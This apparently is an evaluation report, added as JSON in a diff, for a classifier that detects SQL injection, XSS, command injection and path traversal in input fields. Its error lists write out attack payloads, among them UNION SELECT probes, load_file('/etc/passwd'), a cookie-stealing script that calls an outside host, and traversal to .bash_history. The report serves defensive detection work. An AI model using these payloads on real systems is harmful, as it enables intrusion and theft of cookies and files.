@@ -1,0 +1,1243 @@
+{
+  "version": "v2",
+  "trained_rows": 9000,
+  "held_out_families": [
+    "cmd:%0A:dl",
+    "cmd:%24%28:cred",
+    "cmd:%24%28:dl",
+    "cmd:%24%28:rev",
+    "cmd:%26%26:cred",
+    "cmd:%3B:cred",
+    "cmd:%3B:misc",
+    "cmd:%3B:rev",
+    "cmd:%7C%7C:dl",
+    "cmd:%7C%7C:obf",
+    "cmd:%7C%7C:rev",
+    "cmd:%7C:recon",
+    "normal:address",
+    "normal:email",
+    "normal:filename",
+    "normal:math",
+    "normal:number",
+    "normal:password",
+    "normal:phone",
+    "normal:phrase",
+    "normal:title_case",
+    "normal:username",
+    "sqli:probe",
+    "sqli:union",
+    "trav:tricks",
+    "xss:misc",
+    "xss:script"
+  ],
+  "family_holdout": {
+    "n": 2523,
+    "fast_path": true,
+    "attack_recall_at_0.5": 0.9040566645202833,
+    "attack_recall_at_0.8": 0.819703799098519,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.0,
+    "macro_f1": 0.8946004858347187,
+    "per_class_f1": {
+      "normal": 0.9069658719027583,
+      "cmd_injection": 0.9897510980966325,
+      "sqli": 0.5828092243186582,
+      "xss": 0.9934762348555451,
+      "path_traversal": 1.0
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          970,
+          0,
+          0,
+          0,
+          0
+        ],
+        [
+          1,
+          338,
+          0,
+          0,
+          0
+        ],
+        [
+          193,
+          5,
+          139,
+          0,
+          0
+        ],
+        [
+          5,
+          1,
+          1,
+          533,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          0,
+          337
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 950,
+        "mean_risk": 0.016,
+        "attack_rate": 0.016
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 92,
+        "mean_risk": 0.294,
+        "attack_rate": 0.793
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 98,
+        "mean_risk": 0.466,
+        "attack_rate": 0.837
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 110,
+        "mean_risk": 0.69,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 1273,
+        "mean_risk": 0.958,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": [
+      {
+        "value": "1' ORDER BY 1--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.456
+      },
+      {
+        "value": "-1 UNION SELECT table_name%2C2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.31
+      },
+      {
+        "value": "0 union select load_file('/etc/passwd')",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "-1%20UNION%20SELECT%20table_name%2C2%20FROM%20information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "Sneha Fernandes' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.212
+      },
+      {
+        "value": "deploy'#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.388
+      },
+      {
+        "value": "olga'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.262
+      },
+      {
+        "value": "deploy'#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.388
+      },
+      {
+        "value": "root'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.527
+      },
+      {
+        "value": "ps laptoP NeeD MoviE<ScRiPt>FeTch('//x.Io?C='+DOcumenT.cookie)</scRIpt>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.563
+      },
+      {
+        "value": "-1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "0 union select load_file%28%27/etc/passwd%27%29",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.31
+      },
+      {
+        "value": "Mohammed Fernandes' union all select 1,2,3,version()-- -",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.303
+      },
+      {
+        "value": "Aarav O%27Brien1%27 ORDER BY 1--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.171
+      },
+      {
+        "value": "Maria Iyer' union all select 1,2,3,version()-- -",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.473
+      },
+      {
+        "value": "deploy'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.466
+      },
+      {
+        "value": "' GROUP BY 1,2--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.533
+      },
+      {
+        "value": "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "0 union select load_file('/etc/passwd')",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "0%20union%20select%20load_file%28%27%2Fetc%2Fpasswd%27%29",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "-1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "-1  UNION  SELECT  table_name,2  FROM  information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "1' ORDER BY 1--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.456
+      },
+      {
+        "value": "0 union select load_file('/etc/passwd')",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "1 ORDER BY 10#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.233
+      },
+      {
+        "value": "root'#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.391
+      },
+      {
+        "value": "root%2527%2520%252F%252A",
+        "label": "sqli",
+        "pred": "cmd_injection",
+        "risk": 0.668
+      },
+      {
+        "value": "1 ORDER BY 10#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.233
+      },
+      {
+        "value": "1' ORDER BY 5-- -",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.25
+      },
+      {
+        "value": "deploy'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.466
+      },
+      {
+        "value": "' GROUP BY 1,2--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.533
+      },
+      {
+        "value": "%27%20UNION%20SELECT%20NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.31
+      },
+      {
+        "value": "1' ORDER BY 5-- -",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.25
+      },
+      {
+        "value": "the large invoice-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.202
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.31
+      },
+      {
+        "value": "-1 UNION SELECT table_name%2C2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      }
+    ]
+  },
+  "family_holdout_model_only": {
+    "n": 2523,
+    "fast_path": false,
+    "attack_recall_at_0.5": 0.9040566645202833,
+    "attack_recall_at_0.8": 0.819703799098519,
+    "attack_precision_at_0.8": 0.9922057677318784,
+    "normal_fpr_at_0.5": 0.04639175257731959,
+    "macro_f1": 0.8830859028835791,
+    "per_class_f1": {
+      "normal": 0.8908918406072106,
+      "cmd_injection": 0.9534555712270804,
+      "sqli": 0.5803757828810021,
+      "xss": 0.9907063197026023,
+      "path_traversal": 1.0
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          939,
+          26,
+          2,
+          3,
+          0
+        ],
+        [
+          1,
+          338,
+          0,
+          0,
+          0
+        ],
+        [
+          193,
+          5,
+          139,
+          0,
+          0
+        ],
+        [
+          5,
+          1,
+          1,
+          533,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          0,
+          337
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 757,
+        "mean_risk": 0.079,
+        "attack_rate": 0.02
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 182,
+        "mean_risk": 0.28,
+        "attack_rate": 0.401
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 187,
+        "mean_risk": 0.48,
+        "attack_rate": 0.439
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 114,
+        "mean_risk": 0.692,
+        "attack_rate": 0.965
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 1283,
+        "mean_risk": 0.958,
+        "attack_rate": 0.992
+      }
+    ],
+    "errors": [
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.566
+      },
+      {
+        "value": "1' ORDER BY 1--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.456
+      },
+      {
+        "value": "-1 UNION SELECT table_name%2C2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.566
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.31
+      },
+      {
+        "value": "0 union select load_file('/etc/passwd')",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "-1%20UNION%20SELECT%20table_name%2C2%20FROM%20information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "Id Admin Laptop",
+        "label": "normal",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "Sneha Fernandes' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.212
+      },
+      {
+        "value": "deploy'#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.388
+      },
+      {
+        "value": "olga'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.262
+      },
+      {
+        "value": "deploy'#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.388
+      },
+      {
+        "value": "root'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.527
+      },
+      {
+        "value": "ps laptoP NeeD MoviE<ScRiPt>FeTch('//x.Io?C='+DOcumenT.cookie)</scRIpt>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.563
+      },
+      {
+        "value": "Base Cat",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.717
+      },
+      {
+        "value": "-1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "0 union select load_file%28%27/etc/passwd%27%29",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.31
+      },
+      {
+        "value": "Mohammed Fernandes' union all select 1,2,3,version()-- -",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.303
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.566
+      },
+      {
+        "value": "root",
+        "label": "normal",
+        "pred": "normal",
+        "risk": 0.539
+      },
+      {
+        "value": "Aarav O%27Brien1%27 ORDER BY 1--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.171
+      },
+      {
+        "value": "Maria Iyer' union all select 1,2,3,version()-- -",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.473
+      },
+      {
+        "value": "deploy'--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.466
+      },
+      {
+        "value": "' GROUP BY 1,2--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.533
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.566
+      },
+      {
+        "value": "-1 UNION SELECT table_name,2 FROM information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "0 union select load_file('/etc/passwd')",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "0%20union%20select%20load_file%28%27%2Fetc%2Fpasswd%27%29",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "-1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.566
+      },
+      {
+        "value": "root",
+        "label": "normal",
+        "pred": "normal",
+        "risk": 0.539
+      },
+      {
+        "value": "-1  UNION  SELECT  table_name,2  FROM  information_schema.tables--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.438
+      },
+      {
+        "value": "1' ORDER BY 1--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.456
+      },
+      {
+        "value": "0 union select load_file('/etc/passwd')",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.684
+      },
+      {
+        "value": "root",
+        "label": "normal",
+        "pred": "normal",
+        "risk": 0.539
+      },
+      {
+        "value": "1+63",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.576
+      },
+      {
+        "value": "1 ORDER BY 10#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.233
+      }
+    ]
+  },
+  "hard_set_holdout_model": {
+    "n": 125,
+    "fast_path": true,
+    "attack_recall_at_0.5": 0.9647058823529412,
+    "attack_recall_at_0.8": 0.8352941176470589,
+    "attack_precision_at_0.8": 0.9861111111111112,
+    "normal_fpr_at_0.5": 0.025,
+    "macro_f1": 0.9540408760548267,
+    "per_class_f1": {
+      "normal": 0.9397590361445783,
+      "cmd_injection": 0.96,
+      "sqli": 0.9230769230769231,
+      "xss": 1.0,
+      "path_traversal": 0.9473684210526315
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          39,
+          0,
+          1,
+          0,
+          0
+        ],
+        [
+          1,
+          24,
+          0,
+          0,
+          0
+        ],
+        [
+          2,
+          0,
+          18,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          20,
+          0
+        ],
+        [
+          1,
+          1,
+          0,
+          0,
+          18
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 33,
+        "mean_risk": 0.034,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 9,
+        "mean_risk": 0.274,
+        "attack_rate": 0.333
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 2,
+        "mean_risk": 0.525,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 9,
+        "mean_risk": 0.705,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 72,
+        "mean_risk": 0.957,
+        "attack_rate": 0.986
+      }
+    ],
+    "errors": [
+      {
+        "value": "or maybe tomorrow?",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.838
+      },
+      {
+        "value": "z; history | tail -5",
+        "label": "cmd_injection",
+        "pred": "normal",
+        "risk": 0.298
+      },
+      {
+        "value": "1' ORDER BY 3--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.309
+      },
+      {
+        "value": "x') UNION SELECT @@version,NULL#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.387
+      },
+      {
+        "value": "../../../home/deploy/.bash_history",
+        "label": "path_traversal",
+        "pred": "cmd_injection",
+        "risk": 0.829
+      },
+      {
+        "value": "file:///c:/windows/win.ini",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.508
+      }
+    ]
+  },
+  "hard_set_holdout_model_only": {
+    "n": 125,
+    "fast_path": false,
+    "attack_recall_at_0.5": 0.9647058823529412,
+    "attack_recall_at_0.8": 0.8352941176470589,
+    "attack_precision_at_0.8": 0.9861111111111112,
+    "normal_fpr_at_0.5": 0.025,
+    "macro_f1": 0.9540408760548267,
+    "per_class_f1": {
+      "normal": 0.9397590361445783,
+      "cmd_injection": 0.96,
+      "sqli": 0.9230769230769231,
+      "xss": 1.0,
+      "path_traversal": 0.9473684210526315
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          39,
+          0,
+          1,
+          0,
+          0
+        ],
+        [
+          1,
+          24,
+          0,
+          0,
+          0
+        ],
+        [
+          2,
+          0,
+          18,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          20,
+          0
+        ],
+        [
+          1,
+          1,
+          0,
+          0,
+          18
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 28,
+        "mean_risk": 0.096,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 14,
+        "mean_risk": 0.281,
+        "attack_rate": 0.214
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 2,
+        "mean_risk": 0.525,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 9,
+        "mean_risk": 0.705,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 72,
+        "mean_risk": 0.957,
+        "attack_rate": 0.986
+      }
+    ],
+    "errors": [
+      {
+        "value": "or maybe tomorrow?",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.838
+      },
+      {
+        "value": "z; history | tail -5",
+        "label": "cmd_injection",
+        "pred": "normal",
+        "risk": 0.298
+      },
+      {
+        "value": "1' ORDER BY 3--",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.309
+      },
+      {
+        "value": "x') UNION SELECT @@version,NULL#",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.387
+      },
+      {
+        "value": "../../../home/deploy/.bash_history",
+        "label": "path_traversal",
+        "pred": "cmd_injection",
+        "risk": 0.829
+      },
+      {
+        "value": "file:///c:/windows/win.ini",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.508
+      }
+    ]
+  },
+  "hard_set_final_model": {
+    "n": 125,
+    "fast_path": true,
+    "attack_recall_at_0.5": 0.9882352941176471,
+    "attack_recall_at_0.8": 0.8705882352941177,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.025,
+    "macro_f1": 0.976993746091307,
+    "per_class_f1": {
+      "normal": 0.975,
+      "cmd_injection": 0.96,
+      "sqli": 0.975609756097561,
+      "xss": 1.0,
+      "path_traversal": 0.9743589743589743
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          39,
+          0,
+          1,
+          0,
+          0
+        ],
+        [
+          1,
+          24,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          20,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          20,
+          0
+        ],
+        [
+          0,
+          1,
+          0,
+          0,
+          19
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 36,
+        "mean_risk": 0.044,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 3,
+        "mean_risk": 0.276,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 3,
+        "mean_risk": 0.514,
+        "attack_rate": 0.667
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 9,
+        "mean_risk": 0.733,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 74,
+        "mean_risk": 0.971,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": [
+      {
+        "value": "SELECT * menu specials",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.597
+      },
+      {
+        "value": "z; history | tail -5",
+        "label": "cmd_injection",
+        "pred": "normal",
+        "risk": 0.416
+      },
+      {
+        "value": "../../../home/deploy/.bash_history",
+        "label": "path_traversal",
+        "pred": "cmd_injection",
+        "risk": 0.878
+      }
+    ]
+  },
+  "customer_set_holdout_model": {
+    "n": 62,
+    "fast_path": true,
+    "attack_recall_at_0.5": 1.0,
+    "attack_recall_at_0.8": 0.9090909090909091,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.0,
+    "macro_f1": 1.0,
+    "per_class_f1": {
+      "normal": 1.0,
+      "cmd_injection": 1.0,
+      "sqli": 1.0,
+      "xss": 1.0,
+      "path_traversal": 1.0
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          40,
+          0,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          6,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          6,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          6,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          0,
+          4
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 40,
+        "mean_risk": 0.046,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 2,
+        "mean_risk": 0.651,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 20,
+        "mean_risk": 0.962,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": []
+  },
+  "customer_set_final_model": {
+    "n": 62,
+    "fast_path": true,
+    "attack_recall_at_0.5": 1.0,
+    "attack_recall_at_0.8": 1.0,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.0,
+    "macro_f1": 1.0,
+    "per_class_f1": {
+      "normal": 1.0,
+      "cmd_injection": 1.0,
+      "sqli": 1.0,
+      "xss": 1.0,
+      "path_traversal": 1.0
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          40,
+          0,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          6,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          6,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          6,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          0,
+          4
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 40,
+        "mean_risk": 0.047,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 22,
+        "mean_risk": 0.971,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": []
+  }
+}
